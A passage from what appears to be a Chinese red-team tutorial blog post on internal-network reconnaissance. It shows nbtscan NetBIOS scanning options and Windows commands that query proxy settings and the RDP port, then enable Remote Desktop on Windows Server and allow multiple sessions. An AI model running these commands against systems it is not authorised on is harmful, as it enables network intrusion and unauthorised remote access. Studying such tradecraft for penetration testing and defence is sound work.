<span class="hljs-string">    -r use local port 137 for scans. Win95 boxes respond to this only.You need to be root to use this option on Unix.</span>
<span class="hljs-string">    -q Suppress banners and error messages,</span>
<span class="hljs-string">    -s separator Script-friendly output. Don&#x27;</span>t print <span class="hljs-keyword">column</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">record</span> headers, separate <span class="hljs-keyword">fields</span> <span class="hljs-keyword">with</span> separator.
    -h Print human-readable <span class="hljs-keyword">names</span> <span class="hljs-keyword">for</span> services. Can <span class="hljs-keyword">only</span> be used <span class="hljs-keyword">with</span> -v option.
    -m retransmits <span class="hljs-built_in">Number</span> <span class="hljs-keyword">of</span> retransmits. <span class="hljs-keyword">Default</span> <span class="hljs-number">0.</span>
    -f filename Take IP addresses <span class="hljs-keyword">to</span> <span class="hljs-keyword">scan</span> <span class="hljs-keyword">from</span> <span class="hljs-keyword">file</span> filename.
    -f - makes nbtscan take IP addresses <span class="hljs-keyword">from</span> stdin.
    &lt;scan_range&gt; what <span class="hljs-keyword">to</span> scan. Can either be single IP 
        <span class="hljs-keyword">like</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> <span class="hljs-keyword">or</span>
        <span class="hljs-keyword">range</span> <span class="hljs-keyword">of</span> addresses <span class="hljs-keyword">in</span> one <span class="hljs-keyword">of</span> two forms:
        xxx.xxx.xxx.xxx/xx <span class="hljs-keyword">or</span> xxx.xxx.xxx.xxx-xxx.

Examples:
    nbtscan -r <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>
        Scans the whole C-<span class="hljs-keyword">class</span> network.
    nbtscan <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.25</span><span class="hljs-number">-137</span>
        Scans a <span class="hljs-keyword">range</span> <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.25</span> <span class="hljs-keyword">to</span> <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.137</span>
    nbtscan -v -s : <span class="hljs-number">192.168</span><span class="hljs-number">.1</span><span class="hljs-number">.0</span>/<span class="hljs-number">24</span>
        Scans C-<span class="hljs-keyword">class</span> network. Prints results <span class="hljs-keyword">in</span> script-friendly
        <span class="hljs-keyword">format</span> <span class="hljs-keyword">using</span> colon <span class="hljs-keyword">as</span> <span class="hljs-keyword">field</span> separator.  
        Produces <span class="hljs-keyword">output</span> <span class="hljs-keyword">like</span> that:
        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:NT_SERVER:<span class="hljs-number">00</span>U
        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:MY_DOMAIN:<span class="hljs-number">00</span>G
        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:ADMINISTRATOR:<span class="hljs-number">03</span>U
        <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.2</span>:OTHER_BOX:<span class="hljs-number">00</span>U
        ...
    nbtscan -f iplist
        Scans IP addresses specified <span class="hljs-keyword">in</span> <span class="hljs-keyword">file</span> iplist.</code></pre><p><strong>NBTscan version 1.5.1:</strong></p><p>项目地址：</p><pre><code class="hljs awk">https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/scallywag/</span>nbtscan</code></pre><hr><h3 id="4-8、内网信息收集之内网代理"><a href="#4-8、内网信息收集之内网代理" class="headerlink" title="4.8、内网信息收集之内网代理"></a>4.8、内网信息收集之内网代理</h3><p><strong>查询代理配置情况</strong></p><pre><code class="hljs taggerscript">reg query &quot;HKEY_CURRENT_USER<span class="hljs-symbol">\S</span>oftware<span class="hljs-symbol">\M</span>icrosoft<span class="hljs-symbol">\W</span>indows<span class="hljs-symbol">\C</span>urrentVersion<span class="hljs-symbol">\I</span>nternet Settings&quot;</code></pre><p><strong>查询并开启远程连接服务</strong><br>查看远程连接端口</p><pre><code class="hljs taggerscript">Reg query &quot;hkey_local_machine<span class="hljs-symbol">\s</span>ystem<span class="hljs-symbol">\c</span>urrentcontrolset<span class="hljs-symbol">\c</span>ontrol<span class="hljs-symbol">\t</span>erminal server<span class="hljs-symbol">\w</span>instations<span class="hljs-symbol">\R</span>DP-Tcp&quot; /v portnumber</code></pre><p>在Windows Server 2003中开启3389端口</p><pre><code class="hljs pgsql">wmic <span class="hljs-type">path</span> win32_terminalservicesetting <span class="hljs-keyword">where</span> (__CLASS !=&quot;&quot;)  <span class="hljs-keyword">call</span> setallowtsconnections <span class="hljs-number">1</span></code></pre><p>在Windows Server 2008和Windows Server 2012中开启3389端口</p><pre><code class="hljs taggerscript">wmic /namespace:<span class="hljs-symbol">\\</span>root<span class="hljs-symbol">\c</span>imv2<span class="hljs-symbol">\t</span>erminalservices path win32_terminalservicesetting where (__CLASS !=&quot;&quot;) call setallowtsconnections 1

wmic /namespace:<span class="hljs-symbol">\\</span>root<span class="hljs-symbol">\c</span>imv2<span class="hljs-symbol">\t</span>erminalservices path win32_tsgeneralsetting where (TerminalName=&#x27;RDP-Tcp&#x27;) call setuserauthenticationrequired 1

reg add &quot;HKLM<span class="hljs-symbol">\S</span>YSTEM<span class="hljs-symbol">\C</span>URRENT<span class="hljs-symbol">\C</span>ONTROLSET<span class="hljs-symbol">\C</span>ONTROL<span class="hljs-symbol">\T</span>ERMINAL SERVER&quot; /v fSingleSessionPerUser /t REG_DWORD /d 0 /f</code></pre></div><hr><div><div class="post-metas mb-3"><div class="post-meta mr-3"><i class="iconfont icon-category"></i> <a class="hover-with-bg" href="/categories/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a></div><div class="post-meta"><i class="iconfont icon-tags"></i> <a class="hover-with-bg" href="/tags/%E7%BA%A2%E9%98%9F%E6%94%BB%E9%98%B2/">红队攻防</a> <a class="hover-with-bg" href="/tags/%E6%B8%97%E9%80%8F%E6%94%BB%E5%87%BB%E7%BA%A2%E9%98%9F%E7%99%BE%E7%A7%91%E5%85%A8%E4%B9%A6/">渗透攻击红队百科全书</a></div></div><p class="note note-warning"><strong>本文作者: </strong><a href="/">iceH</a><br><strong>本文链接: </strong><a href="http://www.secice.cn/p/56572a0f">http://www.secice.cn/p/56572a0f</a><br><strong>版权声明: </strong>本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！</p><div class="post-prevnext row"><article class="post-prev col-6"><a href="/p/ad5b2fbd"><i class="iconfont icon-arrowleft"></i> <span class="hidden-mobile">红队攻防学习之权限提升</span> <span class="visible-mobile">上一篇</span></a></article><article class="post-next col-6"><a href="/p/2197435e"><span class="hidden-mobile">红队攻防学习之穿透与转发</span> <span class="visible-mobile">下一篇</span> <i class="iconfont icon-arrowright"></i></a></article></div></div><article class="comments" id="comments"><div id="vcomments"></div><script type="text/javascript">Fluid.utils.waitElementVisible("vcomments",(function(){Fluid.utils.createScript("https://cdn.staticfile.org/valine/1.4.14/Valine.min.js",(function(){new Valine({el:"#vcomments",app_id:"MnjV8raNBztIVGGKiicFL3Sq-MdYXbMMI",app_key:"hS70MmgmzDqbMSkSAfkDe42h",placeholder:"留下你的小脚印吧...",path:window.location.pathname,avatar:"wavatar",meta:["nick","mail"],pageSize:"10",lang:"zh-CN",highlight:!1,recordIP:!1,serverURLs:""})}))}))</script><noscript>Please enable JavaScript to view the <a target="_blank" href="https://valine.js.org" rel="nofollow noopener noopener">comments powered by Valine.</a></noscript></article></article></div></div></div><div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn"><div id="toc"><p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p><div class="toc-body" id="toc-body"></div></div></div></div></div><div class="col-lg-7 mx-auto nopadding-md"><div class="container custom post-custom mx-auto"><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/img/psb.gif" srcset="/img/loading.gif" class="rounded mx-auto d-block mt-5" style="width:300px;height:150px"></div></div><a id="scroll-top-button" href="#" role="button"><i class="iconfont icon-arrowup" aria-hidden="true"></i></a><div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable modal-lg" role="document"><div class="modal-content"><div class="modal-header text-center"><h4 class="modal-title w-100 font-weight-bold">搜索</h4><button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button></div><div class="modal-body mx-3"><div class="md-form mb-5"><input type="text" id="local-search-input" class="form-control validate"> <label data-error="x" data-success="v" for="local-search-input">关键词</label></div><div class="list-group" id="local-search-result"></div></div></div></div></div></main><footer class="text-center mt-5 py-3"><div class="footer-content"><span>iceH</span> <i class="iconfont icon-love"></i> <span>一条啥也不会的咸鱼！</span></div></footer><script src="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.js"></script><link rel="stylesheet" href="https://cdn.staticfile.org/nprogress/0.2.0/nprogress.min.css"><script>NProgress.configure({showSpinner:!1,trickleSpeed:200}),NProgress.start(),document.addEventListener("DOMContentLoaded",(function(){window.NProgress&&window.NProgress.inc()})),window.addEventListener("load",(function(){NProgress.done()}))</script><script src="https://cdn.staticfile.org/jquery/3.5.1/jquery.min.js"></script><script src="https://cdn.staticfile.org/twitter-bootstrap/4.5.3/js/bootstrap.min.js"></script><script src="/js/debouncer.js"></script><script src="/js/events.js"></script><script src="/js/plugins.js"></script><script src="/js/lazyload.js"></script><script src="https://cdn.staticfile.org/tocbot/4.12.0/tocbot.min.js"></script><script src="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.js"></script><script src="https://cdn.staticfile.org/anchor-js/4.3.0/anchor.min.js"></script><script defer src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script><script src="https://cdn.staticfile.org/typed.js/2.0.11/typed.min.js"></script><script>!function(t,i){(0,Fluid.plugins.typing)(i.getElementById("subtitle").title)}(window,document)</script><script src="/js/local-search.js"></script><script>document.querySelector("#local-search-input").onclick=function(){searchFunc("/local-search.xml","local-search-input","local-search-result"),this.onclick=null}</script><script src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/js/qipao.js"></script><script src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/js/jingtaisidai.js"></script><script src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/js/dianjichuzi.js"></script><script src="//cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="//cdn.jsdelivr.net/gh/metowolf/MetingJS@1.2/dist/Meting.min.js"></script><script src="/js/boot.js"></script></body></html>